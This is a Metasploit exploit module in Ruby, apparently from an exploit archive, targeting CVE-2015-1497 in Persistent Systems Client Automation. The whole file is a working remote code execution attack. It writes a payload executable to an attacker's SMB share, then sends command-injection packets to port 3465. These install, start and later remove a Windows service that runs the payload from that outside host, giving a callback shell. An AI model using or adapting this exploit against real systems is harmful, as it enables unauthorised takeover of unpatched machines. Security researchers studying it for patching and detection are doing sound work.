# Date: 2014-10-01
# Exploit Author: Ben Turner
# Vendor Homepage: Previosuly HP, now http://www.persistentsys.com/
# Version: 7.9, 8.1, 9.0, 9.1
# Tested on: Windows XP, Windows 7, Server 2003 and Server 2008
# CVE-2015-1497
# CVSS: 10
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    # Exploit mixins should be called first
    include Msf::Exploit::Remote::SMB
    include Msf::Exploit::EXE  
    include Msf::Auxiliary::Report
 
    # Aliases for common classes
    SIMPLE = Rex::Proto::SMB::Client
    XCEPT  = Rex::Proto::SMB::Exceptions
    CONST  = Rex::Proto::SMB::Constants
 
 
    def initialize
        super(
            &#039;Name&#039;        => &#039;Persistent Systems Client Automation (PSCA, formerly HPCA or Radia) Command Injection Remote Code Execution Vulnerability&#039;,
            &#039;Description&#039; => %Q{
                This module exploits PS Client Automation, by sending a remote service install and creating a callback payload.
            },
            &#039;Author&#039;         => [ &#039;Ben Turner&#039; ],
            &#039;License&#039;        => BSD_LICENSE,
            &#039;References&#039;  =>
                [
                ],
            &#039;Privileged&#039;     => true,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;WfsDelay&#039;     => 10,
                    &#039;EXITFUNC&#039; => &#039;process&#039;
                },
            &#039;Payload&#039;     => { &#039;BadChars&#039; => &#039;&#039;, &#039;DisableNops&#039; => true },
            &#039;Platform&#039;    => [&#039;win&#039;],
            &#039;Targets&#039;         =>
                [
                    [ &#039;PS Client Automation on Windows XP, 7, Server 2003 & 2008&#039;, {}]
                ],
            &#039;DefaultTarget&#039;   => 0,
            &#039;DisclosureDate&#039; => &#039;January 10 2014&#039;
        )
 
        register_options([
            OptString.new(&#039;SMBServer&#039;, [true, &#039;The IP address of the SMB server&#039;, &#039;192.168.1.1&#039;]),
            OptString.new(&#039;SMBShare&#039;, [true, &#039;The root directory that is shared&#039;, &#039;share&#039;]),
            Opt::RPORT(3465),
        ], self.class)
 
    end
 
    def exploit
 
        createservice = "\x00\x24\x4D\x41\x43\x48\x49\x4E\x45\x00\x20\x20\x20\x20\x20\x20\x20\x20\x00"
        createservice << "Nvdkit.exe service install test -path \"c:\\windows\\system32\\cmd.exe /c \\\\#{datastore[&#039;SMBServer&#039;]}\\#{datastore[&#039;SMBShare&#039;]}\\installservice.exe\""
        createservice << "\x22\x00\x00\x00"
 
                startservice = "\x00\x24\x4D\x41\x43\x48\x49\x4E\x45\x00\x20\x20\x20\x20\x20\x20\x20\x20\x00"
                startservice << "Nvdkit service start test"
                startservice << "\x22\x00\x00\x00"
 
        removeservice = "\x00\x24\x4D\x41\x43\x48\x49\x4E\x45\x00\x20\x20\x20\x20\x20\x20\x20\x20\x00"
        removeservice << "Nvdkit service remove test"
        removeservice << "\x22\x00\x00\x00"
 
        def filedrop()
            begin
                origrport = self.datastore[&#039;RPORT&#039;]
                self.datastore[&#039;RPORT&#039;] = 445
                origrhost = self.datastore[&#039;RHOST&#039;]
                self.datastore[&#039;RHOST&#039;] = self.datastore[&#039;SMBServer&#039;]
                connect()
                smb_login()
                print_status("Generating payload, dropping here: \\\\#{datastore[&#039;SMBServer&#039;]}\\#{datastore[&#039;SMBShare&#039;]}\\installservice.exe&#039;...")
                self.simple.connect("\\\\#{datastore[&#039;SMBServer&#039;]}\\#{datastore[&#039;SMBShare&#039;]}")
                exe = generate_payload_exe
                fd = smb_open("\\installservice.exe", &#039;rwct&#039;)
                fd << exe
                fd.close
 
                self.datastore[&#039;RPORT&#039;] = origrport
                self.datastore[&#039;RHOST&#039;] = origrhost
             
            rescue Rex::Proto::SMB::Exceptions::Error => e
                print_error("File did not exist, or could not connect to the SMB share: #{e}\n\n") 
                abort()
            end
        end
 
        def filetest()
            begin
                origrport = self.datastore[&#039;RPORT&#039;]
                self.datastore[&#039;RPORT&#039;] = 445
                origrhost = self.datastore[&#039;RHOST&#039;]
                self.datastore[&#039;RHOST&#039;] = self.datastore[&#039;SMBServer&#039;]
                connect()
                smb_login()
                print_status("Checking the remote share: \\\\#{datastore[&#039;SMBServer&#039;]}\\#{datastore[&#039;SMBShare&#039;]}")
                self.simple.connect("\\\\#{datastore[&#039;SMBServer&#039;]}\\#{datastore[&#039;SMBShare&#039;]}")
                file = "\\installservice.exe"
                filetest = smb_file_exist?(file)
                if filetest
                    print_good("Found, upload was succesful! \\\\#{datastore[&#039;SMBServer&#039;]}\\#{datastore[&#039;SMBShare&#039;]}\\#{file}\n")
                else
                    print_error("\\\\#{datastore[&#039;SMBServer&#039;]}\\#{file} - The file does not exist, try again!")
                         
                end
 
                self.datastore[&#039;RPORT&#039;] = origrport
                self.datastore[&#039;RHOST&#039;] = origrhost
             
            rescue Rex::Proto::SMB::Exceptions::Error => e
                print_error("File did not exist, or could not connect to the SMB share: #{e}\n\n") 
                abort()
            end
        end
 
        begin
            filedrop()
            filetest()
            connect()
            sock.put(createservice)
            print_status("Creating the callback payload and installing the remote service")
            disconnect
            sleep(5)
            connect()
            sock.put(startservice)
                        print_good("Exploit sent, awaiting response from service. Waiting 15 seconds before removing the service")
            disconnect
            sleep(30)
            connect
            sock.put(removeservice)
            disconnect
 
        rescue ::Exception => e
            print_error("Could not connect to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}\n\n")
            abort()
         
        end
    end
end

